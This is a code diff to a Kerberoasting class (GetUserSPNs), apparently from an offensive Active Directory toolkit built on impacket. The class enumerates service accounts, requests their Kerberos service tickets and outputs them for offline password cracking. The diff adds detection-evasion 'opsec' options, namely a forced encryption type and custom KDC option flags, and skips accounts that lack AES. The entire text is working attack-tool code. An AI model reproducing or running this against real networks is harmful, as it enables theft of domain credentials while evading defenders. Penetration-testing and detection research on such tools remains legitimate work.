@@ -47,12 +47,12 @@ from impacket.examples.utils import parse_credentials
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP
 from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
 from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection
 from impacket.ntlm import compute_lmhash, compute_nthash
 
+from powerview.lib.kerberosv5 import getKerberosTGT, getKerberosTGS
 
 class GetUserSPNs:
     @staticmethod
@@ -72,7 +72,7 @@ class GetUserSPNs:
         for row in items:
             print(outputFormat.format(*row))
 
-    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions, identity=None):
+    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions, identity=None, options=None, encType=None):
         self.__username = username
         self.__password = password
         self.__domain = user_domain
@@ -101,6 +101,10 @@ class GetUserSPNs:
             logging.warning('DC ip will be ignored because of cross-domain targeting.')
             self.__kdcHost = None
 
+        #opsec options
+        self.__encryption = encType
+        self.__options = options
+
     def getMachineName(self):
         if self.__kdcHost is not None and self.__targetDomain == self.__domain:
             s = SMBConnection(self.__kdcHost, self.__kdcHost)
@@ -126,7 +130,7 @@ class GetUserSPNs:
         t /= 10000000
         return t
 
-    def getTGT(self):
+    def getTGT(self, encType):
         if self.__doKerberos:
             domain, _, TGT, _ = CCache.parseFile(self.__domain)
             if TGT is not None:
@@ -143,19 +147,19 @@ class GetUserSPNs:
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                 compute_lmhash(self.__password),
                                                                 compute_nthash(self.__password), self.__aesKey,
-                                                                kdcHost=self.__kdcHost)
+                                                                kdcHost=self.__kdcHost, encType=encType)
             except Exception as e:
                 logging.debug('TGT: %s' % str(e))
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                     unhexlify(self.__lmhash),
                                                                     unhexlify(self.__nthash), self.__aesKey,
-                                                                    kdcHost=self.__kdcHost)
+                                                                    kdcHost=self.__kdcHost, encType=encType)
 
         else:
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                 unhexlify(self.__lmhash),
                                                                 unhexlify(self.__nthash), self.__aesKey,
-                                                                kdcHost=self.__kdcHost)
+                                                                kdcHost=self.__kdcHost, encType=encType)
         TGT = {}
         TGT['KDC_REP'] = tgt
         TGT['cipher'] = cipher
@@ -265,8 +269,31 @@ class GetUserSPNs:
                 # Let's get unique user names and a SPN to request a TGS for
                 users = dict( (vals[1], vals[0]) for vals in answers)
 
+                # Check for forced encryption
+                enctype = self.__encryption
+
                 # Get a TGT for the current user
-                TGT = self.getTGT()
+                TGT = self.getTGT(enctype)
+
+                # convert hex to binary
+                kdcopt = self.__options
+                if kdcopt == None:
+                    kdcopt = "0x40810010"
+
+                scale = 16
+                kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)
+
+                # enable options based on binary (left to right)
+                opt = list()
+                kdc_opts = list()
+                idx = -1
+                for b in kdcbin:
+                    idx += 1
+                    if int(b) == 1:
+                        opt.append(constants.KDCOptions(idx).value)
+                        kdc_opts.append(constants.KDCOptions(idx).name)
+
+                logging.debug("Using KDC Options (" + ','.join(kdc_opts) + ")")
 
                 for user, SPN in users.items():
                     sAMAccountName = user
@@ -277,10 +304,15 @@ class GetUserSPNs:
                         principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                         principalName.components = [downLevelLogonName]
 
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
-                                                                                self.__kdcHost,
-                                                                                TGT['KDC_REP'], TGT['cipher'],
-                                                                                TGT['sessionKey'])
+                        try:
+                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
+                                                                                    self.__kdcHost,
+                                                                                    TGT['KDC_REP'], TGT['cipher'],
+                                                                                    TGT['sessionKey'], opt, enctype)
+                        except:
+                            logging.error(f"User {principalName} does not support AES encryption")
+                            continue
+
                         sess_key = self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName)
                         entry_out['attributes'] = {'sAMAccountName': sAMAccountName,
                                                'servicePrincipalName': SPN,
